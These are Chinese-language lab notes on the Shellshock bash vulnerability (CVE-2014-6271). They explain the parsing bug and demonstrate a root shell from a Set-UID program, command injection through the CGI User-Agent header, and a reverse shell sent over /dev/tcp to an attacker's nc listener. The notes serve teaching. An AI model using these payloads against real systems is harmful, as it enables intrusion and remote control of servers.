# 第三章 Shellshock 攻击


shellshock漏洞：CVE-2014-6271
利用了bash将环境变量转换为函数定义时犯的一个错误

## Shellshock漏洞

bash version 4.1.0 -> bash_shellshock

`$wget http://labfile.oss.aliyuncs.com/bash-4.1.tar.gz`


```sh
yuan@ubuntu:~/Cap3-shellshock$ foo='() { echo "hello"; }; echo "extra";'
yuan@ubuntu:~/Cap3-shellshock$ echo $foo
() { echo "hello"; }; echo "extra";
yuan@ubuntu:~/Cap3-shellshock$ export foo
yuan@ubuntu:~/Cap3-shellshock$ bash_shellshock 
extra
yuan@ubuntu:~/Cap3-shellshock$ echo $foo

yuan@ubuntu:~/Cap3-shellshock$ declare -f foo
foo () 
{ 
    echo "hello"
}
```


bash源代码中的错误 variables.c 


`void initialize_shell_variables(env, privmode)`


bash检查环境变量是否以`() {`开头，一旦发现这样的字符串，Bash将用'='替换空格使该环境变量变成一个函数定义，
然后，bash调用`parse_and_execute()`函数解析该函数定义。然而，`parse_and_execute()`的功能太强大，
他不仅仅解析函数定义，还解析和运行其他shell指令。如果该字符串包含用分号隔开的多个指令，
`parse_and_execute()`会解析和运行每一条



## 利用shellshock攻击Set-UID程序

*有漏洞的程序*:vul.c

```C
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char const *argv[])
{
	setuid(geteuid());
	system("/bin/ls -l");
	return 0;
}
```

> vul.c通过 `setuid(getuid())` 把真实用户ID变为和有效用户ID，若非如此，Bash不会处理从环境变量处获得的函数定义

`$ sudo ln -sf /bin/bash_shellshock /bin/sh`


```sh
yuan@ubuntu:~/Cap3-shellshock$ gcc -o vul.out vul.c 
yuan@ubuntu:~/Cap3-shellshock$ sudo chown root vul.out 
yuan@ubuntu:~/Cap3-shellshock$ sudo chmod 4755 vul.out 
yuan@ubuntu:~/Cap3-shellshock$ export foo='() { echo hello; }; /bin/sh'
yuan@ubuntu:~/Cap3-shellshock$ ./vul.out 
sh-4.1# id
uid=0(root) gid=1000(yuan) 组=1000(yuan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```


## 利用shellshock攻击CGI程序


### 1 环境准备

启动apache2服务， 将test.cgi放到/usr/lib/cgi-bin/文件夹内.
将test.cgi改成755可执行权限。

test.cgi
```bash
#!/bin/bash_shellshock

echo "Content-type: text/plain"
echo
echo
echo "Hello"
```

用kali linux访问
```sh
kali@kali:~Desktop$ curl http://192.168.43.240/cgi-bin/test.cgi

Hello
kali@kali:~Desktop$
```



### web服务器调用CGI程序

`curl -v`会打印出HTTP请求和服务器响应

通过远程访问test2.cgi可以知道，Apache服务器从HTTP请求头中获得User-Agent信息，并将他赋值给一个*HTTP_USER_AGENT*的环境变量
当Apache服务创建一个子进程来执行CGI程序时，会传递该变量以及一些其他的环境变量给CGI程序

```sh
yuan@ubuntu:~$ curl -v http://192.168.43.240/cgi-bin/test.cgi
*   Trying 192.168.43.240...
* TCP_NODELAY set
* Connected to 192.168.43.240 (192.168.43.240) port 80 (#0)
> GET /cgi-bin/test.cgi HTTP/1.1
> Host: 192.168.43.240
> User-Agent: curl/7.58.0	      	    <****注意这里
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sat, 19 Dec 2020 07:29:39 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/plain
< 
** Enviroment Variables **
HTTP_HOST=192.168.43.240
HTTP_USER_AGENT=curl/7.58.0            <****注意这里
HTTP_ACCEPT=*/*
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

...

```


利用*User-Agent*实现攻击


```sh
kali@kali:$ curl -A "() { ;}; echo Content-Type: text/plain; /bin/ls -l" http://192.168.43.240/cgi-bin/test.cgi 
```

> /bin/ls -l 可换成任意希望执行的指令


### 创建反向shell


```sh
Attacker:$ nc -l -p 9090 -v 
Attacker:$ curl -A "() { ;}; echo Content-Type: text/plain; echo;
echo; /bin/bash -i > /dev/tcp/192.168.43.230/9090 0<&1 2>&1" http://192.168.43.240/cgi-bin/test.cgi

```



创建反向shell指令：

```sh
Server:$ /bin/bash -i > /dev/tcp/192.168.43.230/9090 0<&1 2>&1
```

	-i shell的可交互模式
	>/dev/tcp/_ip_/_port_ shell输出重定向至TCP连接，stdout的文件描述符是1
	0<&1 0:stdin 将标准输出设备也用作输入 TCP是一个双向连接
	2>&1 2:stderr